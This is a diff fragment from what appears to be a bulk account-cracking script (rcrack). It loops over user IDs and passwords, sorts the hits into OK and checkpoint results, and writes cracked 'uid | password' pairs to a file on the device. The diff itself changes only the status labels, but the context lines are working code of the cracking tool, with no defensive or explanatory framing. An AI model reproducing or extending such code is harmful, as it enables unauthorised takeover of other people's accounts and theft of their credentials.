@@ -451,14 +451,14 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('    \33[1;30m(NASRAT_CP)     ' +uid+ ' | ' +ps+           '  \33[0;97m')
+                print('    \33[1;30m(NASRAT_CP💔)     ' +uid+ ' | ' +ps+           '  \33[0;97m')
                 open('/sdcard/NASRAT-CP.txt', 'a').write(uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r     %s[NASRATOK] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r     %s[NASRAT➥OK] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
